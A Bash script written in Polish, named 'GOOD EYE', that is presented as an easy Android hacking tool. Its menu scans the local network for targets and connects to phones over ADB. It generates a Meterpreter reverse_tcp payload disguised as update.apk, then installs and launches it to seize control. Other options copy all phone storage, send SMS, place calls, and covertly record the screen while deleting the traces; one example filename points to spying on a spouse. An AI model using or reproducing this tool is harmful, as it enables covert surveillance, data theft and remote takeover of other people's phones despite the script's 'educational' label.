#!/bin/bash


IP_brama="$(ip route | grep via | awk '{print$3}')"
Moje_IP="$(ifconfig | grep 192 | awk '{print$2}')"
UE="$(adb devices | grep 1 | awk {'print$1'})"


przygotuj_srodowisko()
{	
	sudo apt-get install android-tools-adb
	sudo apt-get install scrcpy 
	adb tcpip 5555
	clear
	sudo ./goodeye.sh
}



pokaz_dostepne_cele()
{	
	echo -e "\e[35m Dostepne cele w Twojej sieci to: \e[0m"
	sudo nmap -sP $IP_brama/24 | grep 'report' | awk '{print$5$6}'
	sudo ./goodeye.sh
}

polacz_z_celem()
{
	sudo nmap -sP $IP_brama/24 | grep 'report' | awk '{print$5$6}'	
	echo "podaj IP celu"
	read cel
	sudo adb connect $cel:5555
	sudo ./goodeye.sh
}

podlaczone_cele()
{
	sudo adb devices
	sudo ./goodeye.sh
}

reboot_celu()
{
	sudo adb reboot 
	clear
	sudo ./goodeye.sh
}

generuj_ladunek()
{	
	echo " Podaj IP do komunikacji"
	read R_Moje_IP
	echo " Podaj port do komunikacji"
	read R_PORT
	msfvenom --platform Android --arch dalvik -p android/meterpreter/reverse_tcp LHOST=$R_Moje_IP LPORT=$R_PORT R > update.apk
	clear
	echo " Ladunek wygenerowany "
	sudo ./goodeye.sh
}

zaladuj_ladunek_do_celu()

{
	adb -s $UE install update.apk
	clear
	echo " Ladunek zaladowany do smartfona "
	sleep 2
	echo " Usuwam ladunek z pamieci Kaliego "
	sudo rm update.apk
	sudo ./goodeye.sh
	
}

uruchom_ladunek()
{

	adb shell am start -n com.metasploit.stage/com.metasploit.stage.MainActivity
	sudo ./goodeye.sh
}

sciagnij_zdjecia()
{
	adb pull /sdcard /home/kali/Desktop
	sudo chmod 777 sdcard
	sudo ./goodeye.sh
}

wyslij_SMS()
{	
	clear
	echo " Podaj nr tel np. +48000000000"
	read phone
	echo " Podaj tresc wiadomosci "
	read message
	adb shell service call isms 7 i32 0 s16 "com.android.mms.service" s16 "$phone" s16 "null" s16 "'$message'" s16 "null" s16 "null"
	sudo ./goodeye.sh
}

nagraj_ekran()
{
	echo " Podaj nazwe pliku koncowego nagrania. np. dowod_zdrady_meza.mp4 "
	read file_name
	echo " Podaj czas nagrania. Max 180 sekund "
	read time 
	adb shell screenrecord /sdcard/$file_name.mp4 --time-limit $time
	echo "Trwa pobieranie pliku..."
	adb pull /sdcard/$file_name.mp4
	echo "Trwa kasowanie pliku na urzadzeniu..."
	adb shell rm /sdcard/$file_name.mp4
	sudo chmod 777 $file_name.mp4
	sudo ./goodeye.sh
}

otworz_strone()
{
	echo " Podaj adres strony do otwarcia na urzadzeniu, ex. https://www.google.pl "
	read website
	adb shell input keyevent 82
	sleep 2
	adb shell am start -a android.intent.action.VIEW -d $website
	sudo ./goodeye.sh
}

rozlacz_devices()
{
	adb disconnect
	sudo ./goodeye.sh
}

zaladuj_i_uruchom_dzwiek()
{	
	echo " Podaj sciezke do zaladowania pliku wav. ex /home/kali/Desktop/kot.wav"
	read sciezka
	echo "Podaj nazwe pliku ex. kot.wav"
	read nazwa_pliku 
	adb push $sciezka /sdcard
	adb shell am start -a android.intent.action.VIEW -d file:///sdcard/$nazwa_pliku -t video/wav
	adb shell rm sdcard/$nazwa_pliku
	sudo ./goodeye.sh

}
zdalne_sterowanie()

{
	scrcpy --tcpip=$UE
	sudo ./goodeye.sh
}

zadzwon_na_tel()
{
	echo " Podaj numer telefonu, na ktory chcesz zadzwonic, ex. +48000000000"
	read numer_telefonu_zadzwon
	adb shell am start -a android.intent.action.CALL -d tel:$numer_telefonu_zadzwon
	sudo ./goodeye.sh
}

figlet GOOD EYE
echo "Hakowanie androida nigdy nie bylo tak latwe."

echo "|---------------------------------|"
echo "| Stworzono przez Przemyslaw Szmaj|"
echo "| INSTA: _h4ker                   |"
echo "| STRONA: www.ehaker.pl           |"
echo "| Good Eye, wersja 1.3            |"
echo "| Narzedzie stworzone w celu      |"
echo "| EDUKACYJNYM                     |"
echo "|---------------------------------|"


echo " "
echo "PODLACZONO DO: " 
adb devices | awk '{print$1}'


echo ""
echo -e " [00]  \e[31m Rozlacz urzadzenia \e[0m"
echo -e " [01]  \e[31m Przygotuj srodowisko \e[0m"	
echo -e " [02]  \e[31m Pokaz dostepne cele w sieci \e[0m"
echo -e " [03]  \e[31m Pokaz podlaczone cele \e[0m"
echo -e " [04]  \e[31m Polacz z celem \e[0m"
echo -e " [05]  \e[31m Reboot celu \e[0m"
echo -e " [06]  \e[31m Wygeneruj ladunek do zainfekowania celu \e[0m"
echo -e " [07]  \e[31m Wgraj ladunek do celu \e[0m"
echo -e " [08]  \e[31m Uruchom ladunek w telefonie i przejmij kontrole \e[0m"
echo -e " [09]  \e[31m Pobierz wszystkie pliki z telefonu \e[0m"
echo -e " [10]  \e[31m Wyslij wiadomosc SMS \e[0m"
echo -e " [11]  \e[31m Nagrywanie erkanu smartfona i zacieranie sladow \e[0m"
echo -e " [12]  \e[31m Otworz strone www na urzadzeniu \e[0m "
echo -e " [13]  \e[31m Zaladuj plik muzyczny i odtworz w smartfonie \e[0m "
echo -e " [14]  \e[31m Zdalne sterowanie Smartfonem \e[0m "
echo -e " [15]  \e[31m Zdalnie zadzwon na numer telefonu \e[0m "




read opcja
case "$opcja" in

  "00") rozlacz_devices ;; 
  "01") przygotuj_srodowisko ;;
  "02") pokaz_dostepne_cele ;;
  "03") podlaczone_cele ;;
  "04") polacz_z_celem ;;
  "05") reboot_celu ;;
  "06") generuj_ladunek ;;
  "07") zaladuj_ladunek_do_celu ;;
  "08") uruchom_ladunek ;;
  "09") sciagnij_zdjecia ;;
  "10") wyslij_SMS ;;
  "11") nagraj_ekran ;;
  "12") otworz_strone ;;  
  "13") zaladuj_i_uruchom_dzwiek ;;
  "14") zdalne_sterowanie ;;
  "15") zadzwon_na_tel ;;

  



  *) clear && ./goodeye.sh
  
esac
